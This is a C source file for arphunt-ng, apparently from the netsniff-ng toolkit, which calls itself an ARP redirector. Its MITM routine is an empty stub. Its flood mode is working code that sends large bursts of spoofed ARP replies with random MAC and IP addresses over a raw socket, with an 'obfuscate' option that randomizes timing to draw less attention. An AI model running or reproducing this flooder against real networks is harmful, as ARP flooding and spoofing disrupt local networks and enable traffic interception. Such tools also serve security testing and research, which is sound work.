/*
 * netsniff-ng - the packet sniffing beast
 * By Daniel Borkmann <daniel@netsniff-ng.org>
 * Copyright 2009, 2010 Daniel Borkmann.
 * Subject to the GPL.
 */

/*
 * This rewrite is based on the work of FX <fx@phenoelit.de> ARP
 * redirector / IP bridge that is called ARP0c2.c.
 * This free software uses code and/or concepts developed by
 * Phenoelit (http://www.phenoelit.de) with the permission of the
 * original developers.
 */

#include <stdio.h>
#include <string.h>
#include <curses.h>
#include <getopt.h>
#include <ctype.h>
#include <sys/socket.h>
#include <sys/utsname.h>
#include <sys/ioctl.h>
#include <signal.h>
#include <stdint.h>
#include <stdlib.h>
#include <assert.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netpacket/packet.h>
#include <net/ethernet.h>

#include "error_and_die.h"
#include "xmalloc.h"
#include "system.h"
#include "timespec.h"
#include "compiler.h"
#include "tty.h"
#include "version.h"
#include "netdev.h"
#include "signals.h"
#include "strlcpy.h"
#include "mersenne_twister.h"
#include "bpf.h"

#define DEFAULT_INTERCEPTS  2000
#define DEFAULT_ROUTES      32
#define DEFAULT_AGRESSIVE   64

struct arp_entry {
	struct ether_addr eth;
	struct in_addr ip;
};

struct arp_table {
	struct arp_entry *entries;
	uint32_t count;
};

struct refresh_entry {
	int fresh_flag;
	time_t check_time;
	struct ether_addr eth;
	struct in_addr requester_ip;
	struct in_addr requested_ip;
};

struct refresh_table {
	struct refresh_entry *entries;
	uint32_t count;
};

struct routing_entry {
	uint32_t network;
	uint32_t netmask;
	struct in_addr gateway;
};

struct routing_table {
	struct routing_entry *entries;
	uint32_t count;
};

struct agressive_entry {
	struct in_addr host1, host2;
};

struct agressive_table {
	struct agressive_entry *entries;
	uint32_t count;
};

static sig_atomic_t sigint = 0;
static int verbose = 0;

static struct arp_table	arptable;
static struct refresh_table reftable;
static struct routing_table routetable;
static struct agressive_table agresstable;

static const char *short_options = "d:a:r:foVvh";

static struct option long_options[] = {
	{"dev", required_argument, 0, 'd'},
	{"agressive", required_argument, 0, 'a'},
	{"routing", required_argument, 0, 'r'},
	{"flood", no_argument, 0, 'f'},
	{"obfuscate", no_argument, 0, 'o'},
	{"verbose", no_argument, 0, 'V'},
	{"version", no_argument, 0, 'v'},
	{"help", no_argument, 0, 'h'},
	{0, 0, 0, 0}
};

/* ARP header definition */

#define ARPOP_REQUEST   1    /* ARP request                */
#define ARPOP_REPLY     2    /* ARP reply                  */
#define ARPOP_RREQUEST  3    /* RARP request               */
#define ARPOP_RREPLY    4    /* RARP reply                 */
#define ARPOP_InREQUEST 8    /* InARP request              */
#define ARPOP_InREPLY   9    /* InARP reply                */
#define ARPOP_NAK       10   /* (ATM)ARP NAK               */

struct arppkt {
	uint8_t h_dest[6];   /* destination ether addr     */
	uint8_t h_source[6]; /* source ether addr          */
	uint16_t h_proto;    /* packet type ID field       */
	uint16_t ar_hrd;     /* format of hardware address */
	uint16_t ar_pro;     /* format of protocol address */
	uint8_t ar_hln;      /* length of hardware address */
	uint8_t ar_pln;      /* length of protocol address */
	uint16_t ar_op;      /* ARP opcode (command)       */
	uint8_t ar_sha[6];   /* sender hardware address    */
	uint8_t ar_sip[4];   /* sender IP address          */
	uint8_t ar_tha[6];   /* target hardware address    */
	uint8_t ar_tip[4];   /* target IP address          */
} __attribute__((packed));

//static struct arppkt pkt_arp_request;
static struct arppkt pkt_arp_response;

#define IP_ALEN 4

static void signal_handler(int number)
{
	switch (number) {
	case SIGINT:
		sigint = 1;
		break;
	case SIGHUP:
		break;
	case SIGUSR1:
		/* XXX Show tables */
		break;
	default:
		break;
	}
}

static void help(void)
{
	printf("\narphunt-ng %s, the arp redirector\n", VERSION_STRING);
	printf("http://www.netsniff-ng.org\n\n");
	printf("Usage: arphunt-ng [options]\n");
	printf("Options:\n");
	printf("  -d|--dev <netdev>      Networking device\n");
	printf("  -a|--agressive <conn>  Agressive startup with known connections\n");
	printf("  -r|--routing <table>   Use table file for routing information\n");
	printf("  -f|--flood             Flood network with random ARP replies\n");
	printf("  -o|--obfuscate         Try to be more calm\n");
	printf("  -V|--verbose           Be more verbose\n");
	printf("  -v|--version           Print version\n");
	printf("  -h|--help              Print this help\n");
	printf("\n");
	printf("Examples:\n");
	printf("  arphunt-ng --dev eth0 --flood\n");
	printf("  arphunt-ng --dev eth0 --agressive <conn.txt> --routing <table.txt>\n");
	printf("\n");
	printf("Note:\n");
	printf("  - Sending a SIGUSR1 will show internal tables\n");
	printf("  - For more help try \'man arphunt-ng\'\n");
	printf("\n");
	printf("Please report bugs to <bugs@netsniff-ng.org>\n");
	printf("Copyright (C) 2009, 2010 Daniel Borkmann\n");
	printf("License: GNU GPL version 2\n");
	printf("This is free software: you are free to change and redistribute it.\n");
	printf("There is NO WARRANTY, to the extent permitted by law.\n\n");

	exit(EXIT_SUCCESS);
}

static void version(void)
{
	printf("\narphunt-ng %s, the arp redirector\n", VERSION_STRING);
	printf("http://www.netsniff-ng.org\n\n");
	printf("Please report bugs to <bugs@netsniff-ng.org>\n");
	printf("Copyright (C) 2009, 2010 Daniel Borkmann\n");
	printf("License: GNU GPL version 2\n");
	printf("This is free software: you are free to change and redistribute it.\n");
	printf("There is NO WARRANTY, to the extent permitted by law.\n\n");

	exit(EXIT_SUCCESS);
}

static int arp_loop(const char *ifname, const char *routing_table,
		    const char *connections, int obfuscate)
{
	printf("MD: MITM%s\n\n", obfuscate ? " OBCTE" : "");
	return 0;
}

static int arp_flood(const char *ifname, int obfuscate)
{
	int i, j, limit, sock;
	uint32_t secs = mt_rand_int32() % 30;
	uint8_t mac_addr[ETH_ALEN];
	uint8_t ip_addr[IP_ALEN];
	double sleeptime = 0.0;
	ssize_t ret;
	struct in_addr ipa;
	struct sockaddr	s_addr;

	printf("MD: FLD%s\n\n", obfuscate ? " OBCTE" : "");

	sock = pf_socket();

	while (likely(!sigint)) {
		limit = obfuscate ? 1 + mt_rand_int32() % 10 : 1 + mt_rand_int32() % 12000;

		printf("Begin flooding %u pkts...\n", limit);

		for (i = 0; i < limit; ++i) {
			memset(&pkt_arp_response, 0, sizeof(pkt_arp_response));

			pkt_arp_response.h_proto = htons(0x0806);
			pkt_arp_response.ar_hrd = htons(1);
			pkt_arp_response.ar_pro = htons(0x0800);
			pkt_arp_response.ar_hln = 6;
			pkt_arp_response.ar_pln = 4;
			pkt_arp_response.ar_op = htons(ARPOP_REPLY);

			for (j = 0; j < ETH_ALEN; ++j)
				mac_addr[j] = 1 + mt_rand_int32() % 255;
			for (j = 0; j < IP_ALEN; ++j)
				ip_addr[j] = 1 + mt_rand_int32() % 255;

			memcpy(pkt_arp_response.h_source, mac_addr, ETH_ALEN);
			memcpy(pkt_arp_response.ar_sha, mac_addr, ETH_ALEN);
			memcpy(pkt_arp_response.ar_sip, ip_addr, IP_ALEN);

			for (j = 0; j < ETH_ALEN; ++j)
				mac_addr[j] = 1 + mt_rand_int32() % 255;

			memcpy(pkt_arp_response.h_dest, mac_addr, ETH_ALEN);
			memcpy(pkt_arp_response.ar_tha, mac_addr, ETH_ALEN);
			memcpy(pkt_arp_response.ar_tip, ip_addr, IP_ALEN);

			if (verbose) {
				memcpy(&ipa, ip_addr, IP_ALEN);
				print_green("%s is at %.2x:%.2x:%.2x:%.2x:%.2x:%.2x",
					    inet_ntoa(ipa), mac_addr[0], mac_addr[1],
					    mac_addr[2], mac_addr[3], mac_addr[4],
					    mac_addr[5]);
			}

			memset(&s_addr, 0, sizeof(s_addr));
			strlcpy(s_addr.sa_data, ifname, sizeof(s_addr.sa_data));

			ret = sendto(sock, &pkt_arp_response,
				     sizeof(pkt_arp_response), 0, &s_addr,
				     sizeof(s_addr));
			if (ret < 0) {
				whine("Cannot send arp packet! Interface down?\n");
				goto out;
			}

			if (ret != sizeof(pkt_arp_response))
				whine("Hmm.. wrong sent packet size!\n");

			/* We fake at least some time gap ... */
			xnanosleep(0.0001 * mt_rand_real3());
		}

		sleeptime =  obfuscate ? 1.0 + mt_rand_real3() * secs : 0.0;

		print_blue("Sleeping for %.6lf s", sleeptime);
		xnanosleep(sleeptime);
		print_blue("Waking up", sleeptime);
	}

out:
	close(sock);
	return 0;
}

static void header(void)
{
	printf("%s%s%s\n", colorize_start(bold), "arphunt-ng " 
	       VERSION_STRING, colorize_end());
}

int main(int argc, char **argv)
{
	int c, opt_index, ret, flood = 0, obfuscate = 0;
	char *ifname = NULL;
	char *routing_table = NULL;
	char *connections = NULL;

	check_for_root_maybe_die();

	memset(&arptable, 0, sizeof(arptable));
	memset(&reftable, 0, sizeof(reftable));
	memset(&routetable, 0, sizeof(routetable));
	memset(&agresstable, 0, sizeof(agresstable));

	while ((c = getopt_long(argc, argv, short_options, long_options,
	       &opt_index)) != EOF) {
		switch (c) {
		case 'h':
			help();
			break;
		case 'v':
			version();
			break;
		case 'd':
			ifname = xstrndup(optarg, IFNAMSIZ);
			break;
		case 'a':
			connections = xstrdup(optarg);
			break;
		case 'r':
			routing_table = xstrdup(optarg);
			break;
		case 'f':
			flood = 1;
			break;
		case 'o':
			obfuscate = 1;
			break;
		case 'V':
			verbose = 1;
			break;
		case '?':
			switch (optopt) {
			case 'd':
			case 'a':
			case 'r':
				error_and_die(EXIT_FAILURE, "Option -%c "
					      "requires an argument!\n",
					      optopt);
			default:
				if (isprint(optopt))
					whine("Unknown option character "
					      "`0x%X\'!\n", optopt);
				exit(EXIT_FAILURE);
			}
		default:
			break;
		}
	}

	if (argc == 1)
		help();
	if (!ifname)
		error_and_die(EXIT_FAILURE, "No networking device provided!\n");
	if (!strncmp("lo", ifname, IFNAMSIZ))
		error_and_die(EXIT_FAILURE, "lo is not supported!\n");
	if (device_mtu(ifname) == 0)
		error_and_die(EXIT_FAILURE, "This is no networking device!\n");

	register_signal(SIGINT, signal_handler);
	register_signal(SIGHUP, signal_handler);
	register_signal(SIGUSR1, signal_handler);
	register_signal(SIGSEGV, muntrace_handler);

	mt_init_by_random_device();

	header();

	if (flood)
		ret = arp_flood(ifname, obfuscate);
	else
		ret = arp_loop(ifname, routing_table, connections, obfuscate);

	xfree(ifname);
	if (routing_table)
		xfree(routing_table);
	if (connections)
		xfree(connections);
	return ret;
}

